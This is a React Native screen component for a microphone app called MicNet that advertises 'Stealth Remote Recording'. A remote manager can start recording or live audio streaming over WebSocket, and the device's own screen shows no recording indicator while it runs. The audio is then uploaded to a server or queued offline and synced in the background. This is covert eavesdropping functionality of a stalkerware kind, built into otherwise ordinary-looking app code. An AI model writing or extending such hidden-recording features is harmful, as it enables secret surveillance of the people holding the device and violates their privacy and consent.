/**
 * HomeScreen.tsx — MicNet User Mode
 * Supports Stealth Remote Recording and Offline Background Sync
 */

import React, { useState, useEffect, useRef } from 'react';
import { View, Text, StyleSheet, TouchableOpacity, ScrollView, Animated, Platform } from 'react-native';

let useAudioRecorder: any = () => ({
  prepareToRecordAsync: async () => {},
  record: () => {},
  stop: async () => {},
  uri: ''
});
let useAudioRecorderState: any = () => ({ durationMillis: 0 });
let useAudioStream: any = () => null;
let RecordingPresets: any = { HIGH_QUALITY: {} };

if (Platform.OS !== 'web') {
  const expoAudio = require('expo-audio');
  useAudioRecorder = expoAudio.useAudioRecorder;
  useAudioRecorderState = expoAudio.useAudioRecorderState;
  useAudioStream = expoAudio.useAudioStream;
  RecordingPresets = expoAudio.RecordingPresets;
}
import { wsService, WsMessage } from '../services/WebSocketService';
import { requestMicPermission, configureAudioForRecording, formatDuration, arrayBufferToBase64, uploadRecordingToServer, uploadBlobToServer, STREAM_OPTIONS } from '../services/AudioService';
import { webAudioService } from '../services/WebAudioService';
import { addToOfflineQueue, processOfflineQueue } from '../services/OfflineQueue';
import NetInfo from '@react-native-community/netinfo';

interface Props {
  deviceId: string;
  deviceName: string;
  backgroundRecording: boolean;
  serverHttpUrl: string;
  authToken: string;
}

export default function HomeScreen({ deviceId, deviceName, backgroundRecording, serverHttpUrl, authToken }: Props) {
  const [permissionGranted, setPermissionGranted] = useState(false);
  const [userUiRecording, setUserUiRecording] = useState(false);
  const [elapsed, setElapsed] = useState(0);
  const [uploadStatus, setUploadStatus] = useState<string | null>(null);

  const audioRecorder = useAudioRecorder(RecordingPresets.HIGH_QUALITY);
  const recorderState = useAudioRecorderState(audioRecorder);
  const streamResult = useAudioStream(STREAM_OPTIONS);

  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const startTimeRef = useRef<number>(0);
  
  // Stealth flags
  const isRecordingRef = useRef(false);
  const managerRecordingRef = useRef(false);
  const userRecordingRef = useRef(false);
  
  const isStreamingRef = useRef(false);
  const streamListenerRef = useRef<any>(null);

  const [pulseAnim] = useState(new Animated.Value(1));
  const [syncStatus, setSyncStatus] = useState('');

  // ── Init ───────────────────────────────────────────────────────────────────
  useEffect(() => {
    (async () => {
      let granted = false;
      if (Platform.OS === 'web') {
        granted = await webAudioService.requestPermission();
      } else {
        granted = await requestMicPermission();
      }
      setPermissionGranted(granted);
    })();
  }, []);

  // ── WebSocket Handler ──────────────────────────────────────────────────────
  useEffect(() => {
    const handler = async (msg: WsMessage) => {
      switch (msg.type) {
        case 'start_recording': await startLocalRecording('manager'); break;
        case 'stop_recording':  await stopLocalRecording('manager');  break;
        case 'start_stream':    await startStreaming();              break;
        case 'stop_stream':     stopStreaming();                     break;
      }
    };
    wsService.addHandler(handler);
    return () => wsService.removeHandler(handler);
  }, [serverHttpUrl, authToken]);

  // ── Auto Sync Offline Queue ────────────────────────────────────────────────
  useEffect(() => {
    const unsubscribe = NetInfo.addEventListener(state => {
      if (state.isConnected && serverHttpUrl && authToken) {
        syncOfflineQueue();
      }
    });
    // Also try on mount
    syncOfflineQueue();
    return () => unsubscribe();
  }, [serverHttpUrl, authToken]);

  const syncOfflineQueue = async () => {
    if (!serverHttpUrl || !authToken) return;
    const count = await processOfflineQueue(serverHttpUrl, deviceId, authToken);
    if (count > 0) {
      setSyncStatus(`Synced ${count} offline file${count > 1 ? 's' : ''}`);
      setTimeout(() => setSyncStatus(''), 4000);
    }
  };

  // ── Pulse Animation ────────────────────────────────────────────────────────
  useEffect(() => {
    if (!userUiRecording) {
      pulseAnim.stopAnimation();
      pulseAnim.setValue(1);
    } else {
      Animated.loop(
        Animated.sequence([
          Animated.timing(pulseAnim, { toValue: 1.2, duration: 800, useNativeDriver: true }),
          Animated.timing(pulseAnim, { toValue: 1, duration: 800, useNativeDriver: true }),
        ])
      ).start();
    }
  }, [userUiRecording, pulseAnim]);

  // ── Timer ──────────────────────────────────────────────────────────────────
  const startTimer = () => {
    startTimeRef.current = Date.now();
    setElapsed(0);
    timerRef.current = setInterval(() => setElapsed(Date.now() - startTimeRef.current), 500);
  };
  const stopTimer = () => {
    if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
    setElapsed(0);
  };

  // ── Recording ──────────────────────────────────────────────────────────────
  const startLocalRecording = async (startedBy: 'user' | 'manager') => {
    if (!permissionGranted) return;

    if (startedBy === 'user') {
      setUserUiRecording(true);
      userRecordingRef.current = true;
      startTimer();
    } else {
      managerRecordingRef.current = true;
    }

    if (isRecordingRef.current) return; // Already recording physically
    
    try {
      if (Platform.OS === 'web') {
        await webAudioService.startRecording();
        isRecordingRef.current = true;
        if (startedBy === 'manager') wsService.send({ type: 'recording_started', deviceId });
        return;
      }

      await configureAudioForRecording(backgroundRecording);
      await audioRecorder.prepareToRecordAsync();
      audioRecorder.record();
      isRecordingRef.current = true;
      if (startedBy === 'manager') wsService.send({ type: 'recording_started', deviceId });
    } catch (e: any) { console.log(e); }
  };

  const stopLocalRecording = async (stoppedBy: 'user' | 'manager') => {
    if (stoppedBy === 'user') {
      setUserUiRecording(false);
      userRecordingRef.current = false;
      stopTimer();
    } else {
      managerRecordingRef.current = false;
    }

    if (!isRecordingRef.current) return;

    try {
      if (Platform.OS === 'web') {
        const { blob, durationMillis } = await webAudioService.stopRecording();
        isRecordingRef.current = false;
        const duration = durationMillis / 1000;
        if (wsService.isConnected) {
          wsService.send({ type: 'recording_saved', deviceId, filename: 'web_rec.webm', duration, size: blob.size });
        }
        const isOnline = (await NetInfo.fetch()).isConnected;
        if (isOnline && serverHttpUrl && wsService.isConnected) {
          if (stoppedBy === 'user') setUploadStatus('Uploading…');
          const ok = await uploadBlobToServer(blob, serverHttpUrl, deviceId, authToken);
          if (stoppedBy === 'user') {
            setUploadStatus(ok ? 'Uploaded to Manager' : 'Failed to upload');
            setTimeout(() => setUploadStatus(null), 3000);
          }
        }
        return;
      }

      await audioRecorder.stop();
      const uri = audioRecorder.uri;
      isRecordingRef.current = false;

      // Handle the file that was just saved
      if (uri) {
        const filename = uri.split('/').pop() ?? 'recording.m4a';
        const duration = recorderState.durationMillis / 1000;
        
        // Notify manager if online
        if (wsService.isConnected) {
          wsService.send({ type: 'recording_saved', deviceId, filename, duration, size: 0 });
        }

        // Determine if we can upload
        const isOnline = (await NetInfo.fetch()).isConnected;
        
        if (isOnline && serverHttpUrl && wsService.isConnected) {
          if (stoppedBy === 'user') setUploadStatus('Uploading…');
          const ok = await uploadRecordingToServer(uri, serverHttpUrl, deviceId, authToken);
          if (stoppedBy === 'user') {
            setUploadStatus(ok ? 'Uploaded to Manager' : 'Queued offline');
            setTimeout(() => setUploadStatus(null), 3000);
          }
          if (!ok) await addToOfflineQueue(uri);
        } else {
          await addToOfflineQueue(uri);
          if (stoppedBy === 'user') {
            setUploadStatus('Saved Offline');
            setTimeout(() => setUploadStatus(null), 3000);
          }
        }
      }

      // If the OTHER party still wants to record, immediately start a new session
      if (managerRecordingRef.current || userRecordingRef.current) {
        await configureAudioForRecording(backgroundRecording);
        await audioRecorder.prepareToRecordAsync();
        audioRecorder.record();
        isRecordingRef.current = true;
      } else {
        if (stoppedBy === 'manager') wsService.send({ type: 'recording_stopped', deviceId });
      }
    } catch (e: any) { console.log(e); }
  };

  // ── Streaming ──────────────────────────────────────────────────────────────
  const startStreaming = async () => {
    if (!permissionGranted) return;
    if (isStreamingRef.current) return;
    try {
      if (Platform.OS === 'web') {
        await webAudioService.startStreaming((base64, sampleRate) => {
          if (!isStreamingRef.current) return;
          wsService.send({
            type: 'audio_chunk',
            deviceId,
            chunk: base64,
            sampleRate: sampleRate,
            channels: 1,
            timestamp: Date.now(),
          });
        });
        isStreamingRef.current = true;
        wsService.send({ type: 'stream_started', deviceId });
        return;
      }

      if (!streamResult) return;
      await configureAudioForRecording(backgroundRecording);
      const audioStream = streamResult.stream;
      streamListenerRef.current = audioStream.addListener('audioStreamBuffer', (buffer) => {
        if (!isStreamingRef.current) return;
        const base64 = arrayBufferToBase64(buffer.data);
        wsService.send({
          type: 'audio_chunk',
          deviceId,
          chunk: base64,
          sampleRate: buffer.sampleRate,
          channels: buffer.channels,
          timestamp: buffer.timestamp,
        });
      });
      await audioStream.start();
      isStreamingRef.current = true;
      wsService.send({ type: 'stream_started', deviceId });
    } catch (e: any) { console.log(e); }
  };

  const stopStreaming = () => {
    if (!isStreamingRef.current) return;
    
    if (Platform.OS === 'web') {
      webAudioService.stopStreaming();
      isStreamingRef.current = false;
      wsService.send({ type: 'stream_stopped', deviceId });
      return;
    }

    streamListenerRef.current?.remove();
    streamListenerRef.current = null;
    streamResult?.stream?.stop();
    isStreamingRef.current = false;
    wsService.send({ type: 'stream_stopped', deviceId });
  };

  // ── Render ─────────────────────────────────────────────────────────────────
  if (!permissionGranted) {
    return (
      <View style={styles.centered}>
        <Text style={styles.permTitle}>Microphone Needed</Text>
        <TouchableOpacity style={styles.btnPrimary} onPress={async () => setPermissionGranted(await requestMicPermission())}>
          <Text style={styles.btnPrimaryText}>Allow Mic</Text>
        </TouchableOpacity>
      </View>
    );
  }

  return (
    <ScrollView style={styles.root} contentContainerStyle={styles.content}>
      <View style={styles.centered}>
        
        {uploadStatus && (
          <View style={styles.uploadBadge}>
            <Text style={styles.uploadBadgeText}>{uploadStatus}</Text>
          </View>
        )}

        {syncStatus ? (
          <View style={[styles.uploadBadge, { backgroundColor: 'rgba(16,185,129,0.2)' }]}>
            <Text style={[styles.uploadBadgeText, { color: '#6ee7b7' }]}>{syncStatus}</Text>
          </View>
        ) : null}

        <Animated.View style={{ transform: [{ scale: pulseAnim }] }}>
          <TouchableOpacity 
            style={[styles.bigButton, userUiRecording ? styles.bigButtonActive : null]}
            onPress={() => userUiRecording ? stopLocalRecording('user') : startLocalRecording('user')}
            activeOpacity={0.8}
          >
            <Text style={styles.bigButtonIcon}>{userUiRecording ? '⏹' : '🎙️'}</Text>
          </TouchableOpacity>
        </Animated.View>

        <Text style={styles.statusText}>
          {userUiRecording ? 'Recording...' : 'Tap to Record'}
        </Text>
        
        {userUiRecording && <Text style={styles.timerText}>{formatDuration(elapsed)}</Text>}
      </View>
    </ScrollView>
  );
}

const BG = '#0f1117';
const CARD = '#1a1f2e';
const ACCENT = '#3b82f6';
const DANGER = '#ef4444';

const styles = StyleSheet.create({
  root: { flex: 1, backgroundColor: BG },
  content: { flexGrow: 1 },
  centered: { flex: 1, alignItems: 'center', justifyContent: 'center', padding: 24 },
  permTitle: { fontSize: 20, color: '#fff', marginBottom: 20 },
  btnPrimary: { backgroundColor: ACCENT, paddingHorizontal: 24, paddingVertical: 12, borderRadius: 8 },
  btnPrimaryText: { color: '#fff', fontWeight: 'bold' },
  
  bigButton: {
    width: 160, height: 160, borderRadius: 80, 
    backgroundColor: CARD, borderWidth: 4, borderColor: 'rgba(59,130,246,0.5)',
    alignItems: 'center', justifyContent: 'center',
    marginBottom: 20,
  },
  bigButtonActive: {
    borderColor: DANGER, backgroundColor: 'rgba(239,68,68,0.2)',
  },
  bigButtonIcon: { fontSize: 64 },
  statusText: { fontSize: 18, color: '#94a3b8', fontWeight: '600' },
  timerText: { fontSize: 24, color: DANGER, fontWeight: 'bold', marginTop: 10, fontFamily: 'monospace' },
  
  uploadBadge: { position: 'absolute', top: 0, backgroundColor: 'rgba(59,130,246,0.2)', paddingHorizontal: 16, paddingVertical: 8, borderRadius: 20 },
  uploadBadgeText: { color: '#93c5fd', fontWeight: 'bold' },
});
